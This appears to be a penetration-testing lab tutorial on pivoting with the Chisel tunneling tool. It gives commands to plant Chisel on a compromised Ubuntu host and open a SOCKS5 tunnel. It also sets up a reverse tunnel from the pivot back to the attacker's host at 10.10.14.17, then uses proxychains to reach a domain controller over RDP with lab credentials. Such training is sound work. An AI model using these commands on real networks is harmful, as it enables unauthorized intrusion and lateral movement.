[Chisel](https://github.com/jpillora/chisel) is a TCP/UDP-based tunneling tool written in [Go](https://go.dev/) that uses HTTP to transport data that is secured using SSH. `Chisel` can create a client-server tunnel connection in a firewall restricted environment. Let us consider a scenario where we have to tunnel our traffic to a webserver on the `172.16.5.0`/`23` network (internal network). We have the Domain Controller with the address `172.16.5.19`. This is not directly accessible to our attack host since our attack host and the domain controller belong to different network segments. However, since we have compromised the Ubuntu server, we can start a Chisel server on it that will listen on a specific port and forward our traffic to the internal network through the established tunnel.

#### Transferring Chisel Binary to Pivot Host
```shell-session
scp chisel ubuntu@10.129.202.64:~/
```

Then we can start the Chisel server/listener.
#### Running the Chisel Server on the Pivot Host
```shell
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5
```
The Chisel listener will listen for incoming connections on port `1234` using SOCKS5 (`--socks5`) and forward it to all the networks that are accessible from the pivot host. In our case, the pivot host has an interface on the 172.16.5.0/23 network, which will allow us to reach hosts on that network.

We can start a client on our attack host and connect to the Chisel server.
#### Connecting to the Chisel Server
```shell-session
./chisel client -v 10.129.202.64:1234 socks

2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234
2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=>socks: Listening
```
We see that the client has started listening on port 1080.

the Chisel client has created a TCP/UDP tunnel via HTTP secured using SSH between the Chisel server and the client and has started listening on port 1080. Now we can modify our proxychains.conf file located at `/etc/proxychains.conf` and add `1080` port at the end so we can use proxychains to pivot using the created tunnel between the 1080 port and the SSH tunnel.

#### Editing & Confirming proxychains.conf
```shell-session
V0xD0x@htb[/htb]$ tail -f /etc/proxychains.conf 

#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080
```

Now if we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.
#### Pivoting to the DC
```shell
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

----
## Chisel Reverse Pivot
In the previous example, we used the compromised machine (Ubuntu) as our Chisel server, listing on port 1234. Still, there may be scenarios where firewall rules restrict inbound connections to our compromised target. In such cases, we can use Chisel with the reverse option.

When the Chisel server has `--reverse` enabled, remotes can be prefixed with `R` to denote reversed. The server will listen and accept connections, and they will be proxied through the client, which specified the remote. Reverse remotes specifying `R:socks` will listen on the server's default socks port (1080) and terminate the connection at the client's internal SOCKS5 proxy.

We'll start the server in our attack host with the option `--reverse`.

#### Starting the Chisel Server on our Attack Host
```shell
sudo ./chisel server --reverse -v -p 1234 --socks5
```

Then we connect from the Ubuntu (pivot host) to our attack host, using the option `R:socks`

#### Connecting the Chisel Client to our Attack Host
```shell-session
ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks
```

#### Editing & Confirming proxychains.conf
```shell-session
V0xD0x@htb[/htb]$ tail -f /etc/proxychains.conf 

[ProxyList]
# add proxy here ...
# socks4    127.0.0.1 9050
socks5 127.0.0.1 1080 
```

If we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.
```shell-session
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

**Note:** If you are getting an error message with chisel on the target, try with a [different version](https://github.com/jpillora/chisel/releases).